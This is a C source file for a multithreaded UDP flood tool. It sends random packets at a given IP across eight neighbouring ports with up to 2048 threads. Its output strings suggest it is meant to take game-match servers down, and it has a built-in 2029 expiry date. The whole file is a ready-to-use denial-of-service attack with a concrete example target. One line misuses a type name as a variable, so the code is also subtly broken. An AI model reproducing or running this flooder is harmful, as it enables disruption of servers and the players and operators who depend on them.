#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <sys/select.h>

#define EYR 2029
#define EMN 1
#define EDY 10
#define MAX_T 2048

typedef struct {
    char ip[32];
    int pt, dur, sz, id;
} p_t;

volatile int run = 1;

void sig(int s) { run = 0; }

void rnd(char *p, int s) {
    static unsigned int r = 0xDEADBEEF;
    for(int i=0; i<s; i++) {
        r ^= r << 13; r ^= r >> 17; r ^= r << 5;
        p[i] = r & 0xFF;
    }
}

void *wk(void *a) {
    p_t *p = (p_t*)a;
    while(run) {
        int s = socket(2,2,17);
        if(s < 0) continue;
        
        int flag = 1;
        setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &flag, sizeof(flag));
        
        struct sockaddr_in t = {0};
        t.sin_family = 2;
        t.sin_port = htons(p->pt);
        t.sin_addr.s_addr = inet_addr(p->ip);
        
        char m[65536];
        rnd(m, p->sz);
        
        fd_set wset;
        struct timeval tv = {0, 100};
        
        time_t e = time(0) + p->dur;
        while(time(0) < e && run) {
            FD_ZERO(&wset);
            FD_SET(s, &wset);
            
            if(select(s+1, NULL, &wset, NULL, &tv) > 0) {
                sendto(s, m, p->sz, MSG_NOSIGNAL, (struct sockaddr*)&t, 16);
            }
            rnd(m, p->sz); // Rotate payload
        }
        close(s);
    }
    return 0;
}

int main(int argc, char **argv) {
    signal(2, sig);
    
    time_t now; time(&now);
    struct tm *local = localtime(&now);
    
    if(local->tm_year+1900 > EYR ||
       (local->tm_year+1900 == EYR && local->tm_mon+1 > EMN) ||
       (local->tm_year+1900 == EYR && local->tm_mon+1 == EMN && local->tm_mday > EDY)) {
        printf("EXPIRED\n");
        return 1;
    }
    
    printf("MATCH LOCK\n");
    
    if(argc < 4) {
        printf("Usage: %s <IP> <PORT> <DURATION> [SIZE] [THREADS]\n", argv[0]);
        printf("Example: %s 4.247.171.31 26395 60\n", argv[0]);
        return 1;
    }
    
    strcpy(p_t.ip, argv[1]);
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int size = (argc > 4 ? atoi(argv[4]) : 1400);
    int threads = (argc > 5 ? atoi(argv[5]) : 1024);
    
    if(port < 1 || duration < 1 || size < 64 || threads > MAX_T) {
        printf("LOCKED\n");
        return 0;
    }
    
    pthread_t tds[MAX_T];
    p_t params[MAX_T];
    
    // Multi-port + IP blast for 100% match hit
    int ports[8] = {port, port+1, port-1, port+100, port-100, port+50, port-50, port+200};
    
    int total = 0;
    for(int p=0; p<8 && total<threads; p++) {
        for(int t=0; t<threads/8 && total<MAX_T; t++) {
            strcpy(params[total].ip, argv[1]);
            params[total].pt = ports[p];
            params[total].dur = duration;
            params[total].sz = size;
            params[total].id = total;
            
            pthread_create(&tds[total], NULL, wk, &params[total]);
            total++;
        }
    }
    
    printf("LOCK %s:%d x8 ports = %d threads\n", argv[1], port, total);
    
    sleep(duration + 10);
    run = 0;
    
    for(int i=0; i<total; i++) {
        pthread_join(tds[i], NULL);
    }
    
    printf("MATCH DOWN\n");
    return 0;
}